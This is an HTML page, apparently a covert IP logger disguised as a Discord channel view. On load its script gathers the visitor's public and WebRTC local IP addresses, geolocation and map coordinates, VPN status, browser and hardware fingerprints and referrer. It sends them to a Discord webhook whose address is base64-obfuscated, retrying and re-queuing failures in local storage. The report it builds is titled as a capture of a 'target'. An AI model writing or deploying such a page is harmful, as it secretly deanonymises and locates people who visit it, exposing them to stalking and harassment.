<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>一般</title>
<style>
    /* DiscordのUIに完全偽装（違和感ゼロ） */
    :root {
        --bg: #313338; --text: #dbdee1; --embed-bg: #2b2d31;
        --embed-border: #f23f43; --box-bg: #1e1f22; --link: #00a8fc; --muted: #949ba4;
    }
    body {
        background-color: var(--bg); color: var(--text);
        font-family: system-ui, -apple-system, sans-serif;
        margin: 0; padding: 20px; display: flex; justify-content: center;
    }
    .container { width: 100%; max-width: 600px; }
    .header {
        display: flex; align-items: center; margin-bottom: 20px;
        border-bottom: 1px solid #3f4147; padding-bottom: 10px;
    }
    .header h1 { font-size: 16px; margin: 0 0 0 10px; font-weight: 600; }
    .embed {
        background-color: var(--embed-bg); border-left: 4px solid var(--embed-border);
        border-radius: 4px; padding: 16px; font-size: 14px; line-height: 1.4; word-wrap: break-word;
    }
    .embed-item { margin-bottom: 12px; display: flex; flex-direction: column; }
    .embed-label {
        font-weight: 600; margin-bottom: 6px; display: flex;
        align-items: center; gap: 6px; color: #f2f3f5;
    }
    .embed-value {
        background-color: var(--box-bg); padding: 8px 10px; border-radius: 4px;
        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        border: 1px solid #1a1b1e; word-break: break-all; font-size: 13px;
    }
    .loading { color: var(--muted); font-style: italic; }
    a { color: var(--link); text-decoration: none; }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <span style="color:var(--muted);font-size:20px;">#</span>
        <h1>一般</h1>
    </div>
    <div class="embed">
        <div class="embed-item"><div class="embed-label">🌐 公開IP (生IP)</div><div class="embed-value" id="ui_ip"><span class="loading">取得中...</span></div></div>
        <div class="embed-item"><div class="embed-label">🏠 ローカルIP (WebRTC)</div><div class="embed-value" id="ui_lip"><span class="loading">取得中...</span></div></div>
        <div class="embed-item"><div class="embed-label">🛡️ VPN/Proxy判定</div><div class="embed-value" id="ui_vpn"><span class="loading">判定中...</span></div></div>
        <div class="embed-item"><div class="embed-label">🛰️ ISP / 組織</div><div class="embed-value" id="ui_isp"><span class="loading">取得中...</span></div></div>
        <div class="embed-item"><div class="embed-label">📍 住所情報</div><div class="embed-value" id="ui_loc"><span class="loading">取得中...</span></div></div>
        <div class="embed-item"><div class="embed-label">🗺️ 座標</div><div class="embed-value" id="ui_coord"><span class="loading">取得中...</span></div></div>
        <div class="embed-item"><div class="embed-label">📱 デバイス / UA</div><div class="embed-value" id="ui_ua"><span class="loading">取得中...</span></div></div>
        <div class="embed-item"><div class="embed-label">💻 ハードウェア情報</div><div class="embed-value" id="ui_hw"><span class="loading">取得中...</span></div></div>
    </div>
</div>

<script>
(function() {
    "use strict";

    // =====================================================================
    // 1. 設定とセキュリティ（Webhookの難読化）
    // =====================================================================
    const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9v";
    const _p2 = "a3MvMTU1MTM5NzY3MzU2MTYyNDYyNi96dmxs";
    const _p3 = "eEEwRU8yM0g5SjN4cjBEckUyQkVI" + "N2taWkc2ZVNKQkpSbURuR2NVb0gxaWI1al94TDdTTHg4aTVmcG5ueUlaZw==";
    
    let WH = "";
    try { WH = atob(_p1 + _p2 + _p3); } catch(e) { console.warn("Init error"); }

    const CACHE_KEY = "sys_log_q";
    const SESSION_KEY = "sys_sid";
    
    let sid = "";
    try {
        sid = localStorage.getItem(SESSION_KEY);
        if (!sid) {
            sid = Math.random().toString(36).substring(2, 10).toUpperCase();
            localStorage.setItem(SESSION_KEY, sid);
        }
    } catch(e) { sid = "UNKNOWN"; }

    const _set = (id, txt) => { 
        const el = document.getElementById(id); 
        if(el) el.textContent = txt; 
    };

    // =====================================================================
    // 2. 確実性を担保するキューイング＆リトライシステム
    // =====================================================================
    function _queueData(data) {
        try {
            let q = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]");
            q.push(data);
            if (q.length > 50) q = q.slice(q.length - 50); 
            localStorage.setItem(CACHE_KEY, JSON.stringify(q));
        } catch(e) {}
    }

    async function _flushQueue() {
        if (!WH || !WH.startsWith("https")) return;
        
        let q = [];
        try { q = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]"); } catch(e) {}
        if (q.length === 0) return;

        localStorage.setItem(CACHE_KEY, "[]");
        let failed = [];

        for (let i = 0; i < q.length; i++) {
            const data = q[i];
            const embed = _buildEmbed(data);
            
            let success = false;
            let retries = 0;
            const maxRetries = 3;

            while (!success && retries < maxRetries) {
                try {
                    const res = await fetch(WH, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            username: "Site Logger", 
                            avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
                            embeds: [embed] 
                        })
                    });
                    
                    if (res.status === 429) {
                        const json = await res.json();
                        const wait = (json.retry_after || 2) * 1000;
                        await new Promise(r => setTimeout(r, wait));
                        retries++;
                    } else if (res.ok) {
                        success = true;
                    } else {
                        success = true; 
                    }
                } catch(e) {
                    retries++;
                    await new Promise(r => setTimeout(r, 1000 * retries));
                }
            }

            if (!success) failed.push(data);
            await new Promise(r => setTimeout(r, 600)); 
        }
        
        if (failed.length > 0) {
            try {
                let currentQ = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]");
                localStorage.setItem(CACHE_KEY, JSON.stringify(currentQ.concat(failed)));
            } catch(e) {}
        }
    }

    // =====================================================================
    // 3. インテリジェント・フィンガープリンティング
    // =====================================================================
    function _getCanvasFP() {
        try {
            const c = document.createElement('canvas');
            c.width = 200; c.height = 50;
            const ctx = c.getContext('2d');
            if(!ctx) return "Blocked";
            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069"; ctx.fillText("layer's Anvil", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("layer's Anvil", 4, 17);
            return c.toDataURL().substring(0, 40) + "..."; 
        } catch(e) { return "Error"; }
    }

    function _getWebGLInfo() {
        try {
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
            if (!gl) return "Blocked";
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            if (ext) return `${gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}`;
            return "Supported";
        } catch(e) { return "Error"; }
    }

    async function _getWebRTCIPs() {
        return new Promise((resolve) => {
            const ips = new Set();
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "失敗/Blocked"); return;
                    }
                    const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (m && !m[1].includes(".local")) ips.add(m[1]);
                };
                pc.createOffer().then(o => pc.setLocalDescription(o));
                setTimeout(() => { pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "タイムアウト"); }, 1500);
            } catch(e) { resolve("エラー"); }
        });
    }

    // =====================================================================
    // 4. 最強のIP取得（HTTPS対応APIの3段フォールバック ＋ CORSプロキシ）
    // =====================================================================
    async function _getIPData() {
        // 第一候補: ipwho.is (HTTPS, 高機能)
        try {
            const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(4000) });
            const d = await r.json();
            if(d.success) return {
                ip: d.ip, isp: `${d.connection.asn} ${d.connection.isp}`,
                loc: `${d.country} ${d.region} ${d.city} (${d.postal || '-'})`,
                coord: `${d.latitude},${d.longitude}`, tz: d.timezone.id,
                vpnFlag: (d.security.vpn || d.security.proxy || d.security.tor), mobile: d.security.mobile || false
            };
        } catch(e) {}

        // 第二候補: ipapi.co (HTTPS, 安定)
        try {
            const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
            const d = await r.json();
            if(d.ip) return {
                ip: d.ip, isp: d.org, loc: `${d.country_name} ${d.region} ${d.city} (${d.postal || '-'})`,
                coord: `${d.latitude},${d.longitude}`, tz: d.timezone, vpnFlag: false, mobile: false
            };
        } catch(e) {}

        // 第三候補: ip-api.com (HTTPだがProxy判定が強い。CORSプロキシ経由で叩く)
        try {
            // corsproxy.io を経由してHTTPS環境でも叩けるようにする
            const target = "http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile,query";
            const r = await fetch(`https://corsproxy.io/?${encodeURIComponent(target)}`, { signal: AbortSignal.timeout(5000) });
            const d = await r.json();
            if(d.status === 'success') return {
                ip: d.query, isp: `${d.as} ${d.org}`, loc: `${d.country} ${d.regionName} ${d.city} (${d.zip || '-'})`,
                coord: `${d.lat},${d.lon}`, tz: d.timezone, vpnFlag: (d.proxy || d.hosting), mobile: d.mobile
            };
        } catch(e) {}

        return null;
    }

    // =====================================================================
    // 5. 泥臭いが確実なVPN/DC判定ロジック
    // =====================================================================
    function _analyzeVPN(ipData) {
        if (!ipData) return "取得失敗";
        
        const dcKeys = [
            "amazon", "aws", "google", "cloud", "azure", "microsoft", "digitalocean", 
            "linode", "vultr", "ovh", "hetzner", "contabo", "cloudflare", "fastly", 
            "akamai", "sakura", "idcf", "nii", "data center", "datacenter", "hosting", 
            "server", "vps", "dedicated", "colocation", "m247", "choopa", "leaseweb"
        ];
        const ispLower = (ipData.isp || "").toLowerCase();
        const isDC = dcKeys.some(k => ispLower.includes(k));

        if (ipData.vpnFlag || isDC) return "⚠️ 検出 (VPN / Proxy / DataCenter)";
        else if (ipData.mobile) return "📱 モバイル回線";
        else return "✅ 未検出 (生IPの可能性高)";
    }

    // =====================================================================
    // 6. 超美麗Discord Embed構築
    // =====================================================================
    function _buildEmbed(d) {
        const mapLink = (d.coord && d.coord.includes(',')) 
            ? `\n[🗺️ Googleマップで開く](https://www.google.com/maps?q=${d.coord.replace(' ', '')})` 
            : "";

        return {
            title: "🎯 ターゲット完全捕捉報告",
            description: `セッションID: \`${d.sid}\`\nアクセス日時: ${d.time}`,
            color: 0xf23f43,
            fields: [
                { name: "🌐 公開IP", value: `\`${d.ip}\``, inline: true },
                { name: "🏠 ローカルIP", value: `\`${d.lip}\``, inline: true },
                { name: "🛡️ VPN/Proxy", value: d.vpn, inline: true },
                { name: "🛰️ ISP / 組織", value: d.isp, inline: true },
                { name: "🔢 AS番号", value: d.as || "不明", inline: true },
                { name: "📍 住所", value: `国: ${d.country}\n地域: ${d.region}\n市: ${d.city}\n郵便: ${d.zip}`, inline: false },
                { name: "🗺️ 座標・TZ", value: `${d.coord}\n${d.tz}${mapLink}`, inline: false },
                { name: "📱 デバイス", value: d.device, inline: true },
                { name: "💻 画面", value: d.screen, inline: true },
                { name: "🧠 CPU / メモリ", value: d.hw, inline: true },
                { name: "🎮 GPU / Canvas", value: `GPU: ${d.gpu}\nCanvas: ${d.canvas}`, inline: false },
                { name: "📶 ネットワーク", value: d.net, inline: false },
                { name: "🕵️ User-Agent", value: `\`\`\`\n${d.ua}\n\`\`\``, inline: false },
                { name: "📎 リファラー", value: d.ref, inline: false }
            ],
            footer: { text: "by zombie logger ggs😂" },
            timestamp: new Date().toISOString()
        };
    }

    // =====================================================================
    // 7. メイン実行
    // =====================================================================
    async function _main() {
        _flushQueue();

        const ua = navigator.userAgent;
        const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) || navigator.maxTouchPoints > 0;
        const screenStr = `${window.screen.width}x${window.screen.height} (DPR:${window.devicePixelRatio})`;
        const hw = `CPU: ${navigator.hardwareConcurrency || '?'} | Mem: ${navigator.deviceMemory || '?'}GB`;
        const canvasFP = _getCanvasFP();
        const gpuFP = _getWebGLInfo();
        
        let netStr = "非対応";
        if (navigator.connection) {
            netStr = `Type: ${navigator.connection.effectiveType || '?'} | Down: ${navigator.connection.downlink || '?'}Mbps | RTT: ${navigator.connection.rtt || '?'}ms`;
        }

        _set('ui_ua', ua);
        _set('ui_hw', `${hw}\nGPU: ${gpuFP}`);

        const [lip, ipData] = await Promise.all([ _getWebRTCIPs(), _getIPData() ]);
        _set('ui_lip', lip);

        if (ipData) {
            const vpnStatus = _analyzeVPN(ipData);
            
            _set('ui_ip', ipData.ip);
            _set('ui_vpn', vpnStatus);
            _set('ui_isp', ipData.isp);
            _set('ui_loc', ipData.loc);
            _set('ui_coord', ipData.coord);

            _queueData({
                sid: sid, time: new Date().toLocaleString("ja-JP"),
                ip: ipData.ip, lip: lip, vpn: vpnStatus, isp: ipData.isp,
                as: ipData.isp.split(" ")[0], 
                country: ipData.loc.split(" ")[0] || "?", region: ipData.loc.split(" ")[1] || "?", 
                city: ipData.loc.split(" ")[2] || "?", zip: ipData.loc.split("(")[1]?.replace(")", "") || "?",
                coord: ipData.coord, tz: ipData.tz, 
                device: isMobile ? "Mobile / Tablet" : "PC", screen: screenStr, hw: hw,
                gpu: gpuFP, canvas: canvasFP, net: netStr, ua: ua, ref: document.referrer || "直接アクセス"
            });

            _flushQueue();
        } else {
            _set('ui_ip', "IP取得失敗 (全APIブロック)");
            _set('ui_vpn', "判定不可");
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', _main);
    } else {
        _main();
    }
    
    setInterval(_flushQueue, 15000);

})();
</script>
</body>
</html>
